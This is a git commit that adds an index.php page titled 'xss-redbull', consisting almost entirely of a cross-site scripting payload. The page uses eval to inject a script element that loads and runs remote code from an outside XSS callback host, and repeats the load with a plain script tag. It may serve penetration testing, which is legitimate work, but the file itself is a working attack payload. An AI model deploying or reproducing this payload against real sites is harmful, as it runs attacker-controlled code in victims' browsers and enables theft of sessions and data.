2fd0928670223348c84e9c3199bd538236f3f912
DVS <51111128+divyesh-01@users.noreply.github.com>
2021-02-19 13:01:36 +0530

    Create index.php

---
+++ index.php
@@ -0,0 +1,13 @@
+<html>
+<haed>
+<title>xss-redbull</title>
+</head>
+<body>
+<script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://dvs00.xss.ht\';document.body.appendChild(a)')
+</script>
+<script>
+<script src=https://dvs00.xss.ht></script>
+</script>
+</body>
+</html>
